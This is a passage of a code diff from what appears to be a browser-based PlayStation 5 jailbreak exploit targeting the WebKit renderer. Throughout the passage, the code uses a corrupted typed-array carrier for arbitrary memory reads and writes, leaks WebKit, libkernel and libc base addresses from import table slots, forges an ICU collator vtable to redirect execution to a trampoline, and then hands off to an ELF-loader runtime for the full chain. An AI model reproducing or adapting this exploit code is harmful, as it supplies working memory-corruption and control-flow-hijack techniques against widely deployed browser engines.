             && arenaViewAddress !== realCollatorAddress
@@ -1116,20 +1484,27 @@ function loadHistoryCritical() {
         aimCarrier(candidate, nativeTargetAddress);
         readBytes(targetHeader, rwView, FUNCTION_BYTES);
 
-        functionStructureID = uint32At(targetHeader, 0);
-        const functionButterfly = low48At(targetHeader, 0x08);
-        const functionScope = low48At(targetHeader, 0x10);
-        executableAddress = low48At(targetHeader, 0x18);
+        const functionContract = RENDERER_OBJECTS.jsFunction;
+        const functionStructureID = uint32At(targetHeader, 0);
+        const functionButterfly = low48At(targetHeader,
+            functionContract.butterflyOffset);
+        const functionScope = low48At(targetHeader,
+            functionContract.scopeOffset);
+        executableAddress = low48At(targetHeader,
+            functionContract.executableOffset);
         functionHeaderOK = functionStructureID >= 0x4000
             && functionStructureID < 0x08000000
             && (functionStructureID & 0xf) === 0
             && nativeTargetAddress % 0x10 === 0
-            && targetHeader[4] === 0 && targetHeader[5] === 0x1a
-            && targetHeader[6] === 0x0e
-            && (targetHeader[7] === 0 || targetHeader[7] === 1)
-            && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0
-            && targetHeader[0x16] === 0 && targetHeader[0x17] === 0
-            && targetHeader[0x1e] === 0 && targetHeader[0x1f] === 0
+            && targetHeader[4] === RENDERER_BOOTSTRAP.indexingType
+            && targetHeader[5] === functionContract.cellType
+            && targetHeader[6] === functionContract.typeFlags
+            && (targetHeader[7] <= 1  || targetHeader[7] === 2)
+            && canonicalLow48(targetHeader,
+                functionContract.butterflyOffset)
+            && canonicalLow48(targetHeader, functionContract.scopeOffset)
+            && canonicalLow48(targetHeader,
+                functionContract.executableOffset)
             && functionButterfly > 0x100000000
             && functionButterfly <= 0xffffffffffff
             && functionButterfly % 8 === 0
@@ -1138,7 +1513,12 @@ function loadHistoryCritical() {
             && functionScope % 8 === 0
             && executableAddress > 0x100000000
             && executableAddress <= 0xffffffffffff
-            && executableAddress % 0x10 === 0
+            // ExecutableBase is a JSC GC cell. Precise allocations encode
+            // their class with bit 3 set, so ...8 is valid; only the lower
+            // three bits are guaranteed clear. The subsequent exact
+            // NativeExecutable header and module/import checks remain the
+            // authoritative validation boundary.
+            && executableAddress % 8 === 0
             && (executableAddress & 1) === 0;
 
         if (!functionHeaderOK) {
@@ -1153,9 +1533,12 @@ function loadHistoryCritical() {
         aimCarrier(candidate, executableAddress);
         readBytes(targetHeader, rwView, NATIVE_EXECUTABLE_BYTES);
 
-        nativeExecutableStructureID = uint32At(targetHeader, 0);
-        nativeFunctionAddress = low48At(targetHeader, 0x28);
-        nativeConstructorAddress = low48At(targetHeader, 0x30);
+        const nativeContract = RENDERER_OBJECTS.nativeExecutable;
+        const nativeExecutableStructureID = uint32At(targetHeader, 0);
+        nativeFunctionAddress = low48At(targetHeader,
+            nativeContract.nativeFunctionOffset);
+        nativeConstructorAddress = low48At(targetHeader,
+            nativeContract.nativeConstructorOffset);
         // Base anchor = host-constructor (m_constructor), uniquely pinnable on
         // every build. There are several candidate thunks; pick the one whose
         // subtraction gives a page-aligned webkitBase in the user-module band.
@@ -1164,36 +1547,36 @@ function loadHistoryCritical() {
             const wb = nativeConstructorAddress - P_HOST_CTOR_LIST[ci];
             if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
                 webkitBase = wb;
-                HOST_CONSTRUCTOR_OFFSET = P_HOST_CTOR_LIST[ci];
                 break;
             }
         }
-        const constructorBase = webkitBase;
         const codeDelta = nativeFunctionAddress > nativeConstructorAddress
             ? nativeFunctionAddress - nativeConstructorAddress
             : nativeConstructorAddress - nativeFunctionAddress;
         webkitBaseOK = webkitBase >= 0x800000000
             && webkitBase < 0x900000000
             && webkitBase % 0x4000 === 0
-            && constructorBase === webkitBase
             && nativeFunctionAddress >= webkitBase
-            && nativeFunctionAddress < webkitBase + WEBKIT_TEXT_SIZE
+            && nativeFunctionAddress < webkitBase + WEBKIT_CODE_LIMIT
             && nativeConstructorAddress >= webkitBase
-            && nativeConstructorAddress < webkitBase + WEBKIT_TEXT_SIZE;
+            && nativeConstructorAddress < webkitBase + WEBKIT_CODE_LIMIT;
         nativeExecutableHeaderOK = nativeExecutableStructureID >= 0x4000
             && nativeExecutableStructureID < 0x08000000
             && (nativeExecutableStructureID & 0xf) === 0
-            && targetHeader[4] === 0 && targetHeader[5] === 0x08
-            && targetHeader[6] === 0
-            && (targetHeader[7] === 0 || targetHeader[7] === 1)
-            && targetHeader[0x2e] === 0 && targetHeader[0x2f] === 0
-            && targetHeader[0x36] === 0 && targetHeader[0x37] === 0
+            && targetHeader[4] === RENDERER_BOOTSTRAP.indexingType
+            && targetHeader[5] === nativeContract.cellType
+            && targetHeader[6] === nativeContract.typeFlags
+            && (targetHeader[7] <= 1  || targetHeader[7] === 2)
+            && canonicalLow48(targetHeader,
+                nativeContract.nativeFunctionOffset)
+            && canonicalLow48(targetHeader,
+                nativeContract.nativeConstructorOffset)
             && nativeFunctionAddress >= 0x800000000
             && nativeFunctionAddress < 0x900000000
             && nativeConstructorAddress >= 0x800000000
             && nativeConstructorAddress < 0x900000000
             && nativeFunctionAddress !== nativeConstructorAddress
-            && codeDelta > 0 && codeDelta < WEBKIT_TEXT_SIZE
+            && codeDelta > 0 && codeDelta < WEBKIT_CODE_LIMIT
             && webkitBaseOK;
 
         if (!nativeExecutableHeaderOK) {
@@ -1206,99 +1589,141 @@ function loadHistoryCritical() {
         }
 
         aimCarrier(candidate, nativeTargetAddress);
-        const executableAddress2 = low48At(rwView, 0x18);
+        const executableAddress2 = low48At(rwView,
+            functionContract.executableOffset);
         const functionType2 = rwView[5];
 
         aimCarrier(candidate, executableAddress);
-        const nativeFunctionAddress2 = low48At(rwView, 0x28);
-        const nativeConstructorAddress2 = low48At(rwView, 0x30);
+        const nativeFunctionAddress2 = low48At(rwView,
+            nativeContract.nativeFunctionOffset);
+        const nativeConstructorAddress2 = low48At(rwView,
+            nativeContract.nativeConstructorOffset);
         const nativeExecutableType2 = rwView[5];
         pointersRepeated = executableAddress2 === executableAddress
             && nativeFunctionAddress2 === nativeFunctionAddress
             && nativeConstructorAddress2 === nativeConstructorAddress
-            && functionType2 === 0x1a && nativeExecutableType2 === 0x08;
+            && functionType2 === functionContract.cellType
+            && nativeExecutableType2 === nativeContract.cellType;
 
-        // Port path: leak libkernel_web base directly from three resolved
-        // import GOT slots in libSceNKWebKit's RELRO (getpid, close, __error).
-        // Each slot holds libkernelBase + exportRVA; the three derived bases
-        // must agree. Replaces the fixed 11.60 import-window mechanism.
-        const getpidSlotAddress = webkitBase + P_GETPID_SLOT;
-        const closeSlotAddress = webkitBase + P_CLOSE_SLOT;
-        const errorSlotAddress = webkitBase + P_ERROR_SLOT;
+        if (REFERENCE_ATTESTATION) {
+            const kernelSlotAddress = webkitBase + P_KERNEL_IMPORT_SLOT;
+            const libcSlotAddress = webkitBase + P_LIBC_IMPORT_SLOT;
 
-        aimCarrier(candidate, getpidSlotAddress);
-        getpidPointer = low48At(rwView, 0);
-        const getpidPointer2 = low48At(rwView, 0);
-        const getpidCanonical = rwView[6] === 0 && rwView[7] === 0;
+            aimCarrier(candidate, kernelSlotAddress);
+            const kernelPointer = low48At(rwView, 0);
+            const kernelCanonical = rwView[6] === 0 && rwView[7] === 0;
+            aimCarrier(candidate, kernelSlotAddress);
+            const kernelPointer2 = low48At(rwView, 0);
+            const kernelCanonical2 = rwView[6] === 0 && rwView[7] === 0;
 
-        aimCarrier(candidate, closeSlotAddress);
-        closePointer = low48At(rwView, 0);
-        const closePointer2 = low48At(rwView, 0);
-        const closeCanonical = rwView[6] === 0 && rwView[7] === 0;
+            aimCarrier(candidate, libcSlotAddress);
+            const libcPointer = low48At(rwView, 0);
+            const libcCanonical = rwView[6] === 0 && rwView[7] === 0;
+            aimCarrier(candidate, libcSlotAddress);
+            const libcPointer2 = low48At(rwView, 0);
+            const libcCanonical2 = rwView[6] === 0 && rwView[7] === 0;
 
-        aimCarrier(candidate, errorSlotAddress);
-        errorPointer = low48At(rwView, 0);
-        const errorPointer2 = low48At(rwView, 0);
-        const errorCanonical = rwView[6] === 0 && rwView[7] === 0;
+            kernelBase = kernelPointer - P_KERNEL_IMPORT_EXPORT;
+            libcBase = libcPointer - P_LIBC_IMPORT_EXPORT;
+            const slotsOK = kernelSlotAddress % 8 === 0
+                && libcSlotAddress % 8 === 0
+                && P_KERNEL_IMPORT_SLOT >= WEBKIT_CODE_LIMIT
+                && P_LIBC_IMPORT_SLOT >= WEBKIT_CODE_LIMIT
+                && P_KERNEL_IMPORT_SLOT < 0x10000000
+                && P_LIBC_IMPORT_SLOT < 0x10000000
+                && inPS5UserModuleBand(kernelSlotAddress)
+                && inPS5UserModuleBand(libcSlotAddress);
+            const importsRepeated = kernelPointer === kernelPointer2
+                && libcPointer === libcPointer2;
+            const importsCanonical = kernelCanonical && kernelCanonical2
+                && libcCanonical && libcCanonical2
+                && plausibleCell(kernelPointer) && plausibleCell(libcPointer);
+            gotReadOK = pointersRepeated && slotsOK && importsRepeated
+                && importsCanonical;
+            kernelBaseOK = gotReadOK && inPS5UserModuleBand(kernelBase)
+                && kernelBase % 0x4000 === 0
+                && kernelBase !== webkitBase;
+            libcBaseOK = gotReadOK && inPS5UserModuleBand(libcBase)
+                && libcBase % 0x4000 === 0
+                && libcBase !== webkitBase && libcBase !== kernelBase;
+            gotReadOK = gotReadOK && kernelBaseOK && libcBaseOK;
+        } else {
+            // Exact profiles retain the three independent libkernel imports.
+            const getpidSlotAddress = webkitBase + P_GETPID_SLOT;
+            const closeSlotAddress = webkitBase + P_CLOSE_SLOT;
+            const errorSlotAddress = webkitBase + P_ERROR_SLOT;
 
-        gotReadAttempted = true;
-        gotWindowAddressesOK = getpidSlotAddress % 8 === 0
-            && closeSlotAddress % 8 === 0 && errorSlotAddress % 8 === 0;
-        gotWindowsRepeated = getpidPointer === getpidPointer2
-            && closePointer === closePointer2
-            && errorPointer === errorPointer2;
-        gotCanonicalOK = getpidCanonical && closeCanonical && errorCanonical
-            && plausibleCell(getpidPointer) && plausibleCell(closePointer)
-            && plausibleCell(errorPointer);
-        gotReadOK = pointersRepeated && gotReadAttempted
-            && gotWindowAddressesOK && gotWindowsRepeated && gotCanonicalOK;
+            aimCarrier(candidate, getpidSlotAddress);
+            const getpidPointer = low48At(rwView, 0);
+            const getpidPointer2 = low48At(rwView, 0);
+            const getpidCanonical = rwView[6] === 0 && rwView[7] === 0;
 
-        // Requirements/libc cross-checks are not on the ported notify path; the
-        // three-way libkernel_web agreement is the base validation.
-        requirementsBaseOK = true;
-        libcBaseOK = true;
+            aimCarrier(candidate, closeSlotAddress);
+            const closePointer = low48At(rwView, 0);
+            const closePointer2 = low48At(rwView, 0);
+            const closeCanonical = rwView[6] === 0 && rwView[7] === 0;
 
-        const getpidBase = getpidPointer - P_GETPID_EXP;
-        const closeBase = closePointer - P_CLOSE_EXP;
-        const errorBase = errorPointer - P_ERROR_EXP;
-        getpidStatus = 1;
-        closeStatus = 1;
-        errorStatus = 1;
-        kernelBase = getpidBase;
-        kernelResolvedCount = 3;
-        const kernelConsistent = getpidBase === closeBase
-            && getpidBase === errorBase;
-        kernelBaseOK = gotReadOK && kernelConsistent
-            && inPS5UserModuleBand(kernelBase)
-            && kernelBase % 0x4000 === 0 && kernelBase !== webkitBase;
+            aimCarrier(candidate, errorSlotAddress);
+            const errorPointer = low48At(rwView, 0);
+            const errorPointer2 = low48At(rwView, 0);
+            const errorCanonical = rwView[6] === 0 && rwView[7] === 0;
+
+            const gotWindowAddressesOK = getpidSlotAddress % 8 === 0
+                && closeSlotAddress % 8 === 0 && errorSlotAddress % 8 === 0;
+            const gotWindowsRepeated = getpidPointer === getpidPointer2
+                && closePointer === closePointer2
+                && errorPointer === errorPointer2;
+            const gotCanonicalOK = getpidCanonical && closeCanonical
+                && errorCanonical && plausibleCell(getpidPointer)
+                && plausibleCell(closePointer) && plausibleCell(errorPointer);
+            gotReadOK = pointersRepeated && gotWindowAddressesOK
+                && gotWindowsRepeated && gotCanonicalOK;
+
+            const getpidBase = getpidPointer - P_GETPID_EXP;
+            const closeBase = closePointer - P_CLOSE_EXP;
+            const errorBase = errorPointer - P_ERROR_EXP;
+            kernelBase = getpidBase;
+            const kernelConsistent = getpidBase === closeBase
+                && getpidBase === errorBase;
+            kernelBaseOK = gotReadOK && kernelConsistent
+                && inPS5UserModuleBand(kernelBase)
+                && kernelBase % 0x4000 === 0 && kernelBase !== webkitBase;
+        }
 
         notifyEntryAddress = kernelBase + NOTIFY_OFFSET;
         notifyAddressOK = kernelBaseOK
-            && getpidStatus === 1
             && notifyEntryAddress === kernelBase + NOTIFY_OFFSET
             && notifyEntryAddress >= kernelBase
-            && notifyEntryAddress < kernelBase + KERNEL_TEXT_SIZE;
+            && notifyEntryAddress < kernelBase + NATIVE_TEXT_SIZE;
 
         aimCarrier(candidate, arenaViewAddress);
         const arenaHeaderRepeated = readTwiceMatches(arenaViewHeader, rwView,
             ARENA_VIEW_BYTES);
         const arenaSID = uint32At(arenaViewHeader, 0);
-        const arenaButterfly = low48At(arenaViewHeader, 0x08);
-        arenaBacking = low48At(arenaViewHeader, 0x10);
-        const arenaLength = low48At(arenaViewHeader, 0x18);
+        const arenaButterfly = low48At(arenaViewHeader,
+            RENDERER_LAYOUT.butterflyOffset);
+        arenaBacking = low48At(arenaViewHeader, RENDERER_LAYOUT.vectorOffset);
+        const arenaLength = smallUnsignedAt(arenaViewHeader,
+            RENDERER_LAYOUT.lengthOffset, RENDERER_LAYOUT.lengthBytes);
+        const arenaOffsetZero = RENDERER_LAYOUT.byteOffsetOffset === null
+            || smallUnsignedAt(arenaViewHeader,
+                RENDERER_LAYOUT.byteOffsetOffset,
+                RENDERER_LAYOUT.byteOffsetBytes) === 0;
+        const arenaMode = smallUnsignedAt(arenaViewHeader,
+            RENDERER_LAYOUT.modeOffset, RENDERER_LAYOUT.modeBytes);
         arenaViewHeaderOK = arenaHeaderRepeated && arenaSID === rwSID
             && arenaViewAddress % 8 === 0
-            && arenaViewHeader[4] === 0 && arenaViewHeader[5] === 0x28
-            && arenaViewHeader[6] === 0x08
-            && (arenaViewHeader[7] === 0 || arenaViewHeader[7] === 1)
+            && arenaViewHeader[4] === RENDERER_BOOTSTRAP.indexingType
+            && arenaViewHeader[5] === uint8Contract.cellType
+            && arenaViewHeader[6] === uint8Contract.typeFlags
+            && (arenaViewHeader[7] <= 1  || arenaViewHeader[7] === 2)
             && plausibleCell(arenaButterfly)
             && plausibleCell(arenaBacking) && arenaBacking % 0x10 === 0
-            && canonicalLow48(arenaViewHeader, 0x08)
-            && canonicalLow48(arenaViewHeader, 0x10)
-            && canonicalLow48(arenaViewHeader, 0x18)
+            && canonicalLow48(arenaViewHeader,
+                RENDERER_LAYOUT.butterflyOffset)
+            && canonicalLow48(arenaViewHeader, RENDERER_LAYOUT.vectorOffset)
             && arenaLength === ARENA_BYTES
-            && allZero(arenaViewHeader, 0x20, 0x28)
-            && arenaViewHeader[0x28] === 0x58;
+            && arenaOffsetZero && arenaMode === RENDERER_LAYOUT.modeValue;
 
         if (arenaViewHeaderOK) {
             aimCarrier(candidate, arenaBacking + 0xf00);
@@ -1311,42 +1736,59 @@ function loadHistoryCritical() {
         }
 
         aimCarrier(candidate, realCollatorAddress);
-        const collatorRepeated = readTwiceMatches(collatorHeader, rwView,
-            COLLATOR_BYTES);
+        const collatorStable = readStableCollatorSnapshot(rwView);
+        const collatorContract = RENDERER_OBJECTS.intlCollator;
         const collatorSID = uint32At(collatorHeader, 0);
-        const collatorBoundCompare = low48At(collatorHeader, 0x10);
-        const originalUCollator = low48At(collatorHeader, 0x18);
-        const localeImpl = low48At(collatorHeader, 0x20);
-        const collationImpl = low48At(collatorHeader, 0x28);
-        collatorHeaderOK = collatorRepeated
+        const collatorBoundCompare = low48At(collatorHeader,
+            collatorContract.boundCompareOffset);
+        const collatorPointer = low48At(collatorHeader,
+            collatorContract.collatorOffset);
+        const collatorLocale = low48At(collatorHeader,
+            collatorContract.localeOffset);
+        const collatorCollation = low48At(collatorHeader,
+            collatorContract.collationOffset);
+        collatorHeaderOK = collatorStable
             && collatorSID >= 0x4000 && collatorSID < 0x08000000
             && (collatorSID & 0xf) === 0 && realCollatorAddress % 8 === 0
-            && collatorHeader[4] === 0 && collatorHeader[5] === 0x17
-            && (collatorHeader[7] === 0 || collatorHeader[7] === 1)
-            && allZero(collatorHeader, 0x08, 0x10)
+            && collatorHeader[4] === RENDERER_BOOTSTRAP.indexingType
+            && collatorHeader[5] === collatorContract.cellType
+            && collatorHeader[7] <= 2
+            && allZero(collatorHeader, RENDERER_LAYOUT.butterflyOffset,
+                collatorContract.boundCompareOffset)
             && collatorBoundCompare === compareFnAddress
-            && plausibleAddress(originalUCollator)
-            && plausibleAddress(localeImpl) && plausibleAddress(collationImpl)
-            && canonicalLow48(collatorHeader, 0x10)
-            && canonicalLow48(collatorHeader, 0x18)
-            && canonicalLow48(collatorHeader, 0x20)
-            && canonicalLow48(collatorHeader, 0x28)
-            && collatorHeader[0x30] === 1
-            && collatorHeader[0x33] === 0;
+            && plausibleAddress(collatorPointer)
+            && plausibleAddress(collatorLocale)
+            && plausibleAddress(collatorCollation)
+            && canonicalLow48(collatorHeader,
+                collatorContract.boundCompareOffset)
+            && canonicalLow48(collatorHeader,
+                collatorContract.collatorOffset)
+            && canonicalLow48(collatorHeader,
+                collatorContract.localeOffset)
+            && canonicalLow48(collatorHeader,
+                collatorContract.collationOffset)
+            && collatorHeader[collatorContract.usageOffset]
+                === collatorContract.searchUsageValue
+            && collatorHeader[collatorContract.asciiStateOffset]
+                === collatorContract.falseAsciiStateValue;
         for (let saveCollator = 0; saveCollator < collatorOriginal.length;
             ++saveCollator)
-            collatorOriginal[saveCollator] = collatorHeader[0x18 + saveCollator];
+            collatorOriginal[saveCollator]
+                = collatorHeader[collatorContract.collatorOffset
+                    + saveCollator];
 
         aimCarrier(candidate, compareFnAddress);
         const compareHeaderRepeated = readTwiceMatches(compareFnHeader, rwView,
             BOUND_COMPARE_BYTES);
         const compareSID = uint32At(compareFnHeader, 0);
+        const boundContract = RENDERER_OBJECTS.boundFunction;
         compareFnHeaderOK = compareHeaderRepeated
             && compareSID >= 0x4000 && compareSID < 0x08000000
             && (compareSID & 0xf) === 0 && compareFnAddress % 8 === 0
-            && compareFnHeader[4] === 0 && compareFnHeader[5] === 0x1a
-            && compareFnHeader[6] === 0x0c
-            && (compareFnHeader[7] === 0 || compareFnHeader[7] === 1)
+            && compareFnHeader[4] === RENDERER_BOOTSTRAP.indexingType
+            && compareFnHeader[5] === boundContract.cellType
+            && compareFnHeader[6] === boundContract.typeFlags
+            && (compareFnHeader[7] <= 1  || compareFnHeader[7] === 2)
             && typeof compareFn === "function";
 
         naturalTrampolineAddress = kernelBase + NATURAL_TRAMPOLINE_OFFSET;
@@ -1358,17 +1800,16 @@ function loadHistoryCritical() {
             && fakeUCollatorAddress + 0xe8 <= arenaBacking + ARENA_BYTES
             && fakeVtableAddress >= arenaBacking
             && fakeVtableAddress + 0x130 <= arenaBacking + ARENA_BYTES
-            && getpidStatus === 1
             && notifyAddressOK
             && notifyEntryAddress === kernelBase + NOTIFY_OFFSET
             && notifyEntryAddress >= kernelBase
-            && notifyEntryAddress < kernelBase + KERNEL_TEXT_SIZE
+            && notifyEntryAddress < kernelBase + NATIVE_TEXT_SIZE
             && naturalTrampolineAddress >= kernelBase
-            && naturalTrampolineAddress < kernelBase + KERNEL_TEXT_SIZE;
+            && naturalTrampolineAddress < kernelBase + NATIVE_TEXT_SIZE;
 
         if (arenaLayoutOK && holderHeaderOK && functionHeaderOK
             && nativeExecutableHeaderOK && webkitBaseOK && pointersRepeated
-            && gotReadOK && requirementsBaseOK && libcBaseOK && kernelBaseOK
+            && gotReadOK && kernelBaseOK
             && collatorHeaderOK && compareFnHeaderOK) {
             putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0x00,
                 fakeVtableAddress);
@@ -1393,17 +1834,19 @@ function loadHistoryCritical() {
                     FAKE_VTABLE_OFFSET + 0x128, naturalTrampolineAddress);
         }
 
-        notifyReady = arenaFilledOK && collatorHeaderOK && compareFnHeaderOK
-            && getpidStatus === 1 && notificationRequestOK
+        handoffReady = arenaFilledOK && collatorHeaderOK && compareFnHeaderOK
             && notifyAddressOK;
-        if (notifyReady) {
-            aimCarrier(candidate, realCollatorAddress + 0x18);
-            carrierArmedForCommit = sameBytes(rwView, collatorOriginal,
+        if (handoffReady) {
+            aimCarrier(candidate, realCollatorAddress
+                + collatorContract.collatorOffset);
+            carrierReady = sameBytes(rwView, collatorOriginal,
                 collatorOriginal.length);
-            notifyReady = notifyReady && carrierArmedForCommit;
+            handoffReady = handoffReady && carrierReady;
+            if (handoffReady)
+                persistentCarrier = candidate;
         }
 
-        if (!notifyReady) {
+        if (!handoffReady) {
             restoreCarrier(candidate);
             rwVectorTouched = false;
             targetView[0] = 0xa5;
@@ -1427,313 +1870,248 @@ function loadHistoryCritical() {
         if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
             try { restoreCarrier(candidate); } catch {}
         }
+        if (persistentCarrier === candidate)
+            persistentCarrier = null;
         candidate = null;
         result = null;
         try { targetView[0] = 0xa5; } catch {}
         try { rwMirror[0] = 0x3c; } catch {}
         try { clearPredecessor(); } catch {}
-        compositionError = error;
         compositionState = -1;
     }
 }
 
+function launchRuntime() {
+    if (runtimeStarted) return;
+    if (!persistentCarrier || !rwView || !Slopkit?.Runtime) {
+        hardStop("runtime handoff is incomplete");
+        return;
+    }
+    if (!preloadedProfile) {
+        hardStop("runtime exploit profile was not preloaded");
+        return;
+    }
+    if (!runtimeExtensionCarrierPassed) {
+        if (Slopkit.ElfLoaderJitLifecycle?.installed) {
+            hardStop("JIT lifecycle extension state is untrusted");
+            return;
+        }
+        if (runtimeExtensionLoading) return;
+        runtimeExtensionLoading = true;
+        mark("RUNTIME-EXTENSION-LOAD-BEGIN");
+        const script = document.createElement("script");
+        script.src = "src/elf-loader-jit.js";
+        script.onload = function () {
+            mark("RUNTIME-EXTENSION-LOAD-DONE");
+            runtimeExtensionLoading = false;
+            if (!Slopkit.ElfLoaderJitLifecycle?.installed) {
+                hardStop("JIT lifecycle extension initialization failed");
+                return;
+            }
+            if (!probeRuntimeCarrier()) {
+                hardStop("runtime carrier probe failed after extension load");
+                return;
+            }
+            runtimeExtensionCarrierPassed = true;
+            launchRuntime();
+        };
+        script.onerror = function () {
+            runtimeExtensionLoading = false;
+            hardStop("JIT lifecycle extension load failed");
+        };
+        document.head.appendChild(script);
+        return;
+    }
+    mark("RUNTIME-LAUNCH");
+    runtimeStarted = true;
+    stopped = true;
+    setCaption(t("runtime.caption", { firmware: FW_LABEL }));
+    setStageBanner(t("runtime.stage.preparing"), "");
+    showStatus("", "run");
+    Slopkit.Runtime.bootstrap({
+        firmware: FW_LABEL,
+        exploit: SELECTED_EXPLOIT,
+        p2jbBurnWorkers: 3,
+        mode: RUN_MODE,
+        revision: REVISION,
+        rendererPlacementPairs: PLACEMENT_PAIRS,
+        runtimeExtension: {
+            version: Slopkit.ElfLoaderJitLifecycle.version,
+            installed: true,
+            postLoadCarrierProbe: runtimeExtensionCarrierPassed
+        },
+        profile: preloadedProfile,
+        armToken: Q.get("arm"),
+        carrier: persistentCarrier,
+        rwView,
+        aimCarrier,
+        restoreCarrier,
+        originalVector: rwOriginalVector,
+        webkitBase,
+        kernelBase,
+        libcBase: REFERENCE_ATTESTATION ? libcBase : undefined,
+        arenaView,
+        arenaBase: arenaBacking,
+        collatorAddress: realCollatorAddress,
+        originalCollator: collatorOriginal,
+        compare: compareFn,
+        translate: t,
+        showStatus,
+        showPostExploitActions,
+        setCaption,
+        catState,
+        setStageBanner,
+        mark,
+        setDiagnosticsQuiet
+    }).catch(function (error) {
+        hardStop(error?.message || "full chain failed",
+            error?.recoveryDisposition);
+    });
+}
+
+function probeRuntimeCarrier() {
+    let passed = true;
+    try {
+        if (REFERENCE_ATTESTATION) {
+            for (const [slot, expected] of [
+                [P_KERNEL_IMPORT_SLOT,
+                    kernelBase + P_KERNEL_IMPORT_EXPORT],
+                [P_LIBC_IMPORT_SLOT, libcBase + P_LIBC_IMPORT_EXPORT]
+            ]) {
+                aimCarrier(persistentCarrier, webkitBase + slot);
+                const actual = low48At(rwView, 0);
+                const canonical = rwView[6] === 0 && rwView[7] === 0;
+                if (!canonical || actual !== expected) passed = false;
+            }
+        } else {
+            const address = webkitBase
+                + preloadedProfile.offset("webkit.imports.getpid.slot");
+            const expected = kernelBase
+                + preloadedProfile.offset("webkit.imports.getpid.export");
+            aimCarrier(persistentCarrier, address);
+            const actual = low48At(rwView, 0);
+            const canonical = rwView[6] === 0 && rwView[7] === 0;
+            if (!canonical || actual !== expected) passed = false;
+        }
+    } finally {
+        aimCarrier(persistentCarrier, realCollatorAddress
+            + RENDERER_OBJECTS.intlCollator.collatorOffset);
+    }
+    return passed;
+}
+
+function rendererProfileQueryMismatch(profile) {
+    const expected = profile.rendererQuery();
+    for (const key of ["go", "fw", "mode", "schema", "hc", "gd",
+        "notify", "gps", "gpe", "cls", "cle", "ers", "ere", "wts",
+        "nts", "att", "kis", "kie", "lis", "lie", "wcl", "rc"]) {
+        if (Q.get(key) !== expected.get(key))
+            return key;
+    }
+    if (Slopkit.Profile.encodeRendererContract(profile.rendererContract())
+        !== RENDERER_CONTRACT_QUERY)
+        return "rc-canonical";
+    return "";
+}
+
+function preloadRuntimeProfile() {
+    setStageBanner(t("runtime.stage.preparing"), "");
+    showStatus("", "run");
+    if (!VALID_EXPLOITS.has(SELECTED_EXPLOIT)) {
+        hardStop("invalid exploit selection");
+        return;
+    }
+    if (ARM_CONTEXT_ERROR) {
+        hardStop(ARM_CONTEXT_ERROR);
+        return;
+    }
+    Slopkit.Profile.loadForExploit(OFFSETS_URL, FW_LABEL, RUN_MODE,
+        SELECTED_EXPLOIT).then(function (profile) {
+        verifyArmContextProfile(profile);
+        const mismatch = rendererProfileQueryMismatch(profile);
+        if (mismatch)
+            throw new Error(`renderer query disagrees with profile: ${mismatch}`);
+        preloadedProfile = profile;
+        const record = profile.qualificationRecord?.() || {};
+        startAttempt();
+    }).catch(function (error) {
+        hardStop("runtime exploit profile preload failed: "
+            + (error?.message || "unknown profile error"));
+    });
+}
+
 function reportComposition() {
+    mark("REPORT-COMPOSITION", `state=${compositionState}`
+        + ` rwOK=${rwHeaderOK} holderOK=${holderHeaderOK}`
+        + ` fnOK=${functionHeaderOK} nativeOK=${nativeExecutableHeaderOK}`
+        + ` wkOK=${webkitBaseOK} kernOK=${kernelBaseOK}`
+        + ` libcOK=${!REFERENCE_ATTESTATION || libcBaseOK}`
+        + ` handoff=${handoffReady} carrier=${carrierReady}`);
     if (compositionState < 0) {
-        mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
-            `${compositionError?.name}:`
-            + String(compositionError?.message).slice(0, 80));
-        mark("DONE-THROW", `predecessor-cleared=true-retry-safe=${retrySafe}`
-            + `-candidate-seen=${candidateEverReturned}`
-            + `-candidate-mutated=${candidateMutationStarted}`);
         if (!retrySafe) {
             try { sessionStorage.setItem(blockKey, "1"); } catch {}
-            failed();
-        }
-        if (retrySafe)
+            failed("renderer placement failed");
+        } else {
             scheduleSafeRetry("placement-throw");
+        }
         return;
     }
 
     if (compositionState === 2) {
-        mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
-        mark("DONE-MISS", "predecessor-cleared=true-retry-safe=true"
-            + "-candidate-seen=false-candidate-mutated=false");
         scheduleSafeRetry("normal-clone-miss");
         return;
     }
 
     if (compositionState === 3) {
-        const mismatchTag = zeroHeaderMiss ? "ZERO-HEADER-MISS"
-            : (retrySafe ? "COMPOSITION-LENGTH-MISS" : "VALIDATION-MISMATCH");
-        mark(mismatchTag, `rw=${rwHeaderOK}`
-            + `-holder=${holderHeaderOK}`
-            + `-function=${functionHeaderOK}`
-            + `-native-executable=${nativeExecutableHeaderOK}`
-            + `-base=${webkitBaseOK}`
-            + `-repeat=${pointersRepeated}`
-            + `-retry-safe=${retrySafe}`
-            + `-candidate-seen=${candidateEverReturned}`
-            + `-candidate-mutated=${candidateMutationStarted}`
-            + `-zero-header-miss=${zeroHeaderMiss}`
-            + "-carrier-restored=true");
-        mark("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
-        mark("WALK-BYTES-HEX", dumpHex(targetHeader, NATIVE_EXECUTABLE_BYTES));
         if (!retrySafe) {
             try { sessionStorage.setItem(blockKey, "1"); } catch {}
-            failed();
-        }
-        if (retrySafe)
+            failed("renderer validation failed");
+        } else {
             scheduleSafeRetry(zeroHeaderMiss
                 ? "zero-header-miss" : "composition-length-mismatch");
+        }
         return;
     }
 
     if (compositionState === 0) {
-        mark("NO-RESULT", "critical-load-did-not-finish");
         failed();
         return;
     }
-
-    mark("SSV-RETURNED-CLEARED", `length=${compositionLength}`
-        + "-predecessor-cleared=true");
-    mark("RW-CARRIER", `sid=${hex(uint32At(rwHeader, 0))}`
-        + `-vector=${hex(rwOriginalVector)}`
-        + `-length=0x100-mode=0x${rwHeader[0x28].toString(16)}`);
-    mark("HOLDER", `cell=${hex(targetAddress)}`
-        + `-header-pass=${holderHeaderOK}`);
-    mark("JSFUNCTION", `parseInt=${hex(nativeTargetAddress)}`
-        + `-sid=${hex(functionStructureID)}`
-        + `-executable=${hex(executableAddress)}`);
-    mark("NATIVE-EXECUTABLE", `P=${hex(executableAddress)}`
-        + `-sid=${hex(nativeExecutableStructureID)}`);
-    mark("NATIVE-CALL-TARGET", `parseInt=${hex(nativeFunctionAddress)}`
-        + `-constructor=${hex(nativeConstructorAddress)}`);
